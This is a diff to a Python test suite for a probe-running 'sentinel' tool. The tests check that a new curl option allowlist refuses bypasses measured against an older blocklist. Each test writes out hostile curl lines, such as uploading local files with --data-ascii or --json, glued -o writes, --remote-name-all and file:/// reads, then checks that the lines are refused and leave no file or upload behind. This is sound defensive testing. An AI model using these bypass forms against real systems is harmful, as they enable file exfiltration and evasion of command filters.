@@ -20,9 +20,11 @@ import os
 import subprocess
 import sys
 import tempfile
+import threading
 import time
 import unittest
 from datetime import datetime, timedelta
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 
 HERE = Path(__file__).resolve().parent
@@ -89,11 +91,15 @@ class SentinelBase(unittest.TestCase):
         self.stats.write_text("\n".join(lines) + "\n", encoding="utf-8")
         return self.stats
 
-    def run_sentinel(self, args=(), env_extra=None):
+    def run_sentinel(self, args=(), env_extra=None, cwd=None):
+        """cwd matters for one family of attacks: `curl --remote-name-all`
+        writes into the CURRENT DIRECTORY, so a test that wants to prove no
+        loot file appears has to control where a loot file would land."""
         env = dict(os.environ, **self.env, **(env_extra or {}))
         base = ["--hook-dirs", str(self.hooks)]
         return subprocess.run([sys.executable, str(SENTINEL)] + base + list(args),
-                              capture_output=True, text=True, env=env, timeout=120)
+                              capture_output=True, text=True, env=env, cwd=cwd,
+                              timeout=120)
 
     # --- assertions ---------------------------------------------------------
 
@@ -387,7 +393,7 @@ class TestProbeExecution(SentinelBase):
         self.assertIn("non-canonical path", reasons)
         self.assertIn("systemctl: verb is not read-only", reasons)
         self.assertIn("-o pointing somewhere other than /dev/null", reasons)
-        self.assertIn("forbidden option: -T", reasons)
+        self.assertIn("option outside the allowlist: -T", reasons)
         self.assertFalse(loot.exists(), r.stdout)
         self.assertEqual(len(self.skips(r.stdout)), 4, r.stdout)
 
@@ -414,9 +420,28 @@ class TestProbeExecution(SentinelBase):
         self.assertEqual(self.last_stat()["result"], "observe", self.last_stat())
 
     def test_t24_the_probe_parser_is_the_same_gate_as_recalls_check_field(self):
-        """Pure functions, and the twin of recall.run_check by construction: a
-        second implementation of the same rule is a second thing to get wrong."""
+        """Pure functions, and the SAME OBJECT as the one recall's `check:`
+        field uses -- not "the same by construction", which is what two copies
+        of it claimed while one still accepted `-o/tmp/loot` and the other did
+        not. Both import hooks/_exec_guard.py, so `is` holds here and a fix
+        can no longer land on one side only."""
         mod = sentinel_module()
+        spec = importlib.util.spec_from_file_location(
+            "recall_for_parity", str(ROOT / "recall" / "recall.py"))
+        recall_mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(recall_mod)
+        self.assertIs(mod.binary_refusal, recall_mod.binary_refusal)
+        self.assertIs(mod.SHELL_META_RE, recall_mod.SHELL_META_RE)
+        # A guard that cannot be imported CLOSES the probe family instead of
+        # opening it: fail-open protects the operator's work from a broken
+        # gate, and there is no work of his to protect in a config file that
+        # executes itself.
+        saved, mod.EXEC_GUARD_ERROR = mod.EXEC_GUARD_ERROR, "ImportError: boom"
+        try:
+            self.assertIn("exec guard unavailable", mod.probe_argv(
+                "test -d /tmp", set(mod.DEFAULT_PROBE_ALLOW))[1])
+        finally:
+            mod.EXEC_GUARD_ERROR = saved
         allow = set(mod.DEFAULT_PROBE_ALLOW)
         argv, refusal = mod.probe_argv("test -d /tmp", allow)
         self.assertEqual((argv, refusal), (["test", "-d", "/tmp"], None))
@@ -431,6 +456,247 @@ class TestProbeExecution(SentinelBase):
             allow)[1])
         self.assertIsNone(mod.probe_argv(
             "systemctl --user is-active --quiet example.service", allow)[1])
+
+
+class TestProbeCurlAllowlist(SentinelBase):
+    """One case per bypass MEASURED against the previous BLOCKLIST, curl 8.5.0.
+
+    The blocklist named -O, -T, -d, -F and --config, and the docs promised
+    "curl may neither upload nor write to disk". Every line below was reported
+    OK, not SKIP, and every one of them left loot: a file on disk, or the bytes
+    of a local file in the remote server's log. A blocklist over a CLI with
+    hundreds of options can only ever be a list of the tricks somebody already
+    thought of.
+
+    What a fix has to prove is NOT that the line is refused -- it is that the
+    loot is ABSENT. So every case here runs the attack and a legitimate probe
+    in the SAME probe file, and asserts three things at once: the attack is
+    SKIPped, no file appears where its loot would land, and the local server
+    received EXACTLY the one harmless GET of the legitimate line. That last
+    assertion is what makes the silence meaningful: an empty server log proves
+    nothing if the server was never listening (absent noise is not zero noise).
+    """
+
+    def setUp(self):
+        super().setUp()
+        self.loot = self.root / "loot"
+        self.loot.mkdir()
+        self.received = []
+        self.url = "http://127.0.0.1:%d/probe" % self.start_sink()
+        self.legit = "curl -fsS --max-time 5 -o /dev/null %s" % self.url
+
+    def start_sink(self):
+        """A loopback HTTP server that records every request it receives.
+        Answers with an ETag and a Set-Cookie so the --etag-save and
+        --cookie-jar attacks have something real to write down."""
+        received = self.received
+
+        class Sink(BaseHTTPRequestHandler):
+            def record(self, verb):
+                size = int(self.headers.get("Content-Length") or 0)
+                received.append((verb, self.rfile.read(size) if size else b""))
+                body = b"sink-ok\n"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.send_header("Content-Length", str(len(body)))
+                self.send_header("ETag", '"sink-etag-1"')
+                self.send_header("Set-Cookie", "sinkjar=1; Path=/")
+                self.end_headers()
+                self.wfile.write(body)
+
+            def do_GET(self):
+                self.record("GET")
+
+            def do_POST(self):
+                self.record("POST")
+
+            def do_HEAD(self):
+                self.record("HEAD")
+
+            def log_message(self, *a):
+                pass
+
+        srv = HTTPServer(("127.0.0.1", 0), Sink)
+        self.addCleanup(srv.server_close)
+        self.addCleanup(srv.shutdown)
+        threading.Thread(target=srv.serve_forever, daemon=True).start()
+        return srv.server_address[1]
+
+    def probe_run(self, probe_lines):
+        """The sentinel runs from self.loot: `curl --remote-name-all` writes
+        into the current directory, so the current directory has to be the
+        place the test watches."""
+        self.hook_file("alpha-gate.py")
+        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
+        self.journal([("alpha", 1)])
+        probes = self.root / "probes.txt"
+        probes.write_text("".join(line + "\n" for line in probe_lines),
+                          encoding="utf-8")
+        return self.run_sentinel(["--settings", str(cfg), "--probes", str(probes)],
+                                 cwd=str(self.loot))
+
+    def refuse(self, attack, hint):
+        """The attack is SKIPped, it wrote NOTHING, it sent NOTHING, and the
+        legitimate probe next to it still ran."""
+        self.received.clear()
+        r = self.probe_run([attack, self.legit])
+        probe_lines = self.lines_of(r.stdout, "probe")
+        skipped = [x for x in probe_lines if x.startswith("SKIP")]
+        passed = [x for x in probe_lines if x.startswith("OK")]
+        self.assertEqual(len(skipped), 1,
+                         "%r was not refused:\n%s" % (attack, r.stdout))
+        self.assertIn(hint, skipped[0])
+        self.assertEqual(len(passed), 1,
+                         "the legitimate probe stopped running:\n%s" % r.stdout)
+        self.assertEqual(sorted(os.listdir(self.loot)), [],
+                         "loot was written for %r:\n%s" % (attack, r.stdout))
+        self.assertEqual(self.received, [("GET", b"")],
+                         "the server saw more than the legitimate GET for %r: %r"
+                         % (attack, self.received))
+        # a refused probe is a SKIP, and a SKIP never moves the verdict
+        self.assertEqual(self.verdict_of(r.stdout), "OK", r.stdout)
+        return skipped[0]
+
+    # --- the bypasses, in the order they were measured ----------------------
+
+    def test_t25_output_glued_to_the_flag(self):
+        """-o/tmp/loot.txt: the token never equals "-o", so a blocklist that
+        compares tokens never sees it."""
+        self.refuse("curl -fsS --max-time 3 -o%s/A1.txt %s" % (self.loot, self.url),
+                    "-o takes a value and may be neither glued nor combined")
+
+    def test_t26_output_joined_with_an_equals_sign(self):
+        self.refuse("curl -fsS --max-time 3 --output=%s/A2.txt %s"
+                    % (self.loot, self.url),
+                    "the value of --output must be a separate argument")
+
+    def test_t27_output_letter_buried_in_a_short_cluster(self):
+        """-fsSo: three harmless letters and a write, in one token."""
+        self.refuse("curl -fsSo %s/A3.txt --max-time 3 %s" % (self.loot, self.url),
+                    "-o takes a value and may be neither glued nor combined")
+
+    def test_t28_data_ascii_uploads_a_local_file(self):
+        """The one that is not a disk write at all: the CONTENT of a local
+        file, POSTed to the remote host. The old rule watched -d and --data
+        and never looked at --data-ascii."""
+        self.refuse("curl -sS --max-time 3 -o /dev/null --data-ascii @/etc/hostname %s"
+                    % self.url, "option outside the allowlist: --data-ascii")
+
+    def test_t29_json_uploads_a_local_file(self):
+        self.refuse("curl -sS --max-time 3 -o /dev/null --json @/etc/hostname %s"
+                    % self.url, "option outside the allowlist: --json")
+
+    def test_t30_header_dump_writes_a_file(self):
+        for option in ("-D", "--dump-header"):
+            with self.subTest(option=option):
+                self.refuse("curl -sS --max-time 3 -o /dev/null %s %s/A6.txt %s"
+                            % (option, self.loot, self.url),
+                            "option outside the allowlist: %s" % option)
+
+    def test_t31_trace_ascii_writes_a_file(self):
+        self.refuse("curl -sS --max-time 3 -o /dev/null --trace-ascii %s/A8.txt %s"
+                    % (self.loot, self.url),
+                    "option outside the allowlist: --trace-ascii")
+
+    def test_t32_stderr_redirection_writes_a_file(self):
+        self.refuse("curl -sS --max-time 3 -o /dev/null --stderr %s/A9.txt %s"
+                    % (self.loot, self.url),
+                    "option outside the allowlist: --stderr")
+
+    def test_t33_cookie_jar_writes_a_file(self):
+        for option in ("-c", "--cookie-jar"):
+            with self.subTest(option=option):
+                self.refuse("curl -sS --max-time 3 -o /dev/null %s %s/A10.txt %s"
+                            % (option, self.loot, self.url),
+                            "option outside the allowlist: %s" % option)
+
+    def test_t34_etag_save_writes_a_file(self):
+        self.refuse("curl -sS --max-time 3 -o /dev/null --etag-save %s/A12.txt %s"
+                    % (self.loot, self.url),
+                    "option outside the allowlist: --etag-save")
+
+    def test_t35_remote_name_all_writes_into_the_current_directory(self):
+        """No path in the line at all: curl takes the file name from the URL
+        and writes it wherever the sentinel happens to be running."""
+        self.refuse("curl -sS --max-time 3 --remote-name-all %s/A13.txt" % self.url,
+                    "option outside the allowlist: --remote-name-all")
+
+    def test_t36_form_string_uploads(self):
+        self.refuse("curl -sS --max-time 3 -o /dev/null --form-string secret=leak %s"
+                    % self.url, "option outside the allowlist: --form-string")
+
+    def test_t37_write_out_may_not_write_a_file_through_its_format(self):
+        """-w is allowlisted, and curl >= 8.3 writes to a file from the FORMAT
+        STRING itself (%output{...}). The braces make the metacharacter rule
+        fire first; the curl rule is checked on its own so the guarantee does
+        not rest on that accident."""
+        self.refuse("curl -sS --max-time 3 -o /dev/null -w %%output{%s/W.txt}x %s"
+                    % (self.loot, self.url), "metacharacter")
+        mod = sentinel_module()
+        allow = set(mod.DEFAULT_PROBE_ALLOW)
+        refusal = mod.probe_refusal(
+            ["curl", "-o", "/dev/null", "-w", "%%output{%s/W.txt}x" % self.loot,
+             self.url], allow)
+        self.assertIn("format string", refusal or "")
+        self.assertIn("reading its format from a file", mod.probe_refusal(
+            ["curl", "-o", "/dev/null", "-w", "@/etc/hostname", self.url], allow))
+
+    def test_t38_a_url_that_is_not_http_reads_the_local_disk(self):
+        """file:///etc/hostname is not a network probe, it is a file read."""
+        self.refuse("curl -sS --max-time 3 -o /dev/null file:///etc/hostname",
+                    "URL scheme is not http or https")
+
+    # --- the control: an allowlist that refuses everything protects nothing --
+
+    def test_t39_a_legitimate_health_probe_still_runs(self):
+        """The load-bearing counterweight. A gate that refuses every line is
+        not a safe gate, it is a dead feature."""
+        r = self.probe_run([self.legit,
+                            "curl -s -o /dev/null --connect-timeout 2 %s" % self.url,
+                            "curl -sSI --max-time 5 -o /dev/null %s" % self.url,
+                            "systemctl --user is-active --quiet example.service",
+                            "test -d %s" % self.root])
+        probe_lines = self.lines_of(r.stdout, "probe")
+        self.assertFalse([x for x in probe_lines if x.startswith("SKIP")],
+                         "a legitimate probe was refused:\n%s" % r.stdout)
+        curl_lines = [x for x in probe_lines if " curl " in x]
+        self.assertEqual(len(curl_lines), 3, r.stdout)
+        for line in curl_lines:
+            self.assertTrue(line.startswith("OK"), line)
+        self.assertEqual([verb for verb, _body in self.received],
+                         ["GET", "GET", "HEAD"], self.received)
+        self.assertEqual(sorted(os.listdir(self.loot)), [], r.stdout)
+
+    def test_t40_the_allowlist_is_a_pure_function_and_says_why(self):
+        """Every refusal carries its reason, and the same rules hold for the
+        two other allowlisted binaries."""
+        mod = sentinel_module()
+        allow = set(mod.DEFAULT_PROBE_ALLOW)
+        for allowed in ("curl -fsS --max-time 5 -o /dev/null https://example.com",
+                        "curl -s -o /dev/null --connect-timeout 2 http://a.example/h",
+                        "curl -sSI -m 5 -o /dev/null https://example.com/health",
+                        "systemctl --user is-active --quiet example.service",
+                        "systemctl --no-pager status example.service",
+                        "test -d /var/log"):
+            self.assertIsNone(mod.probe_argv(allowed, allow)[1], allowed)
+        for refused in (
+                "curl -sS -o /dev/null -H X-Loot:secret https://example.com",
+                "curl -sS -o /dev/null -u admin:hunter2 https://example.com",
+                "curl -sS -o /dev/null --upload-file /etc/hostname https://e.example",
+                "curl -sS -m /etc/hostname -o /dev/null https://example.com",
+                "curl -sSm3 -o /dev/null https://example.com",
+                "curl -sS -o /dev/null https://a.example https://b.example",
+                "curl -sS -o /dev/null",
+                "curl -sS -o /dev/null example.com",
+                "curl -sS -o /dev/null scp://host/etc/passwd",
+                "systemctl --user stop example.service",
+                "systemctl --signal status kill example.service",
+                "systemctl is-active --root /mnt example.service",
+                "test -d /tmp /etc",
+                "test -z /tmp",
+                "test -d etc"):
+            refusal = mod.probe_argv(refused, allow)[1]
+            self.assertTrue(refusal, "NOT refused: %s" % refused)
 
 
 class TestMatching(unittest.TestCase):
